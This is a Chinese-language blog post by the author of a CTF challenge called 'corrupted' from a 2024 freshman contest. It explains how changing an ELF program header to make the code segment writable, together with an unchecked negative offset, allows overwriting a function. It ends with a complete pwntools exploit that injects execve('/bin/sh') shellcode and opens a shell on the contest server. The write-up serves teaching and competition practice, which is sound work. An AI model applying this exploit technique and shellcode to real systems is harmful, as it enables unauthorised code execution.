---
title: 赛博杯新生赛 2024 - corrupted 出题博客
date: 2024/12/18 19:37:00
updated: 2024/12/22 10:47:00
tags:
    - noob
    - elf header
    - challenge author
sticky: 92
thumbnail: /assets/cbctf2024/rwx.png
excerpt: 前段时间在看ELF头，正好新生赛到了，可以拿来出一道简单题，类似于ret2shell。对于程序头phdr来说，如果`p_type == PT::LOAD`，那么它就是负责加载程序段的。对于本题的情况，我把原来加载代码段的`rx`改成了`rwx`，这样代码段就变成可读可写可执行了。可以通过设置偏移量为`-1394`修改`verify`函数的内容。可以修改4次，总共32字节，足以写一shellcode了，直接拿shell。
---

前段时间在看ELF头，正好新生赛到了，可以拿来出一道简单题，类似于`ret2shell`。
想看题解的可以跳过出题思路部分。

## 出题思路

首先可以使用ImHex来探查一下文件的结构。加载`elf.hexpat`:

![img](/assets/cbctf2024/elf.png)

大部分内容在[ctf-wiki](https://ctf-wiki.org/executable/elf/structure/basic-info/)
都说得很清楚，我这里就不再赘述了，大家可以参考学习。我的想法主要是如果修改了ELF文件头，
会发生什么呢？

对于程序头`phdr`来说，如果`p_type == PT::LOAD`，那么它就是负责加载程序段的。
对于本题的情况，我把原来加载代码段的`rx`改成了`rwx`，这样代码段就变成可读可写可执行了。

![rwx](/assets/cbctf2024/rwx.png)

我还尝试改过段头`shdr`，但是发现改完后对于程序的加载没有任何影响，甚至把整个`shdr`
全部删掉，程序依然能够运行。

{% note purple fa-bug-slash %}
用gdb直接调试没有段头的程序，会提示可执行文件格式错误，这也是反调试的一种手段。
{% endnote %}

接着讲回`phdr`，在程序头中，存在2个程序安全特性：`PT::GNU_STACK`和`PT::GNU_RELRO`。
对于前者，`p_flags`可以设置程序栈区的权限（可以为`x`，即调整NX）；对于后者，
调整了权限也没用，程序仍然会将GOT表设为只读。删除`PT::GNU_STACK`
会让内核自行选择是否需要开启NX，删除`PT::GNU_RELRO`则会使程序从`Partial RELRO`
或`Full RELRO`回落到`No RELRO`。

{% notel blue fa-arrow-right-to-bracket 隐藏的构造器 %}
有些同学可能看见`randdata`放在bss上，就以为`randdata`里面是空的，只要推算出全0的
SHA256结果就能过verify。然而，程序中还有一个函数`loadBuf`，被标记了`constructor`
属性，在程序运行`main`之前会将从`/dev/random`中的随机数据读入`randdata`中，
因此如果正常猜的话选手是不可能猜中`randdata`的值的。
{% endnotel %}

## 题解

程序可以输入4次qword，并且可以指定相对于`match`的偏移量，但是检查时不严格，
可以为负数。

![check](/assets/cbctf2024/check.png)

在输入完4次qword后，会运行到`verify`函数。运行起来查看`vmmap`，程序代码段是可写的，
再检查`verify`的地址，刚好和`match`差了`0x2b90`个字节，可以通过设置偏移量为`-1394`修改
`verify`函数的内容。

![diff](/assets/cbctf2024/vmmap.png)

可以修改4次，总共32字节，足以写一shellcode了，直接拿shell。

![legend](/assets/cbctf2024/legend.png)

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './corrupted'

def payload(lo: int):
    global sh
    if lo:
        sh = process(EXE)
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('training.0rays.club', 10030)
    elf = ELF(EXE)

    def answer(idx: int, val: int):
        sh.sendlineafter(b'QWORD do', str(idx).encode())
        sh.sendlineafter(b'QWORD to', str(val).encode())

    offset = (elf.symbols['verify'] - elf.symbols['match']) // 8
    shell = '''
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi, esi
    push 0x3b
    pop rax
    cdq
    syscall
    '''
    shc = asm(shell) # 21 bytes

    answer(offset, u64(shc[:8]))
    answer(offset + 1, u64(shc[8:16]))
    answer(offset + 2, unpack(shc[16:], 'all'))
    answer(0, 0)

    sh.clean()
    sh.interactive()
    sh.close()
```

## 参考

[ELF 文件 - CTF Wiki](https://ctf-wiki.org/executable/elf/structure/basic-info/)
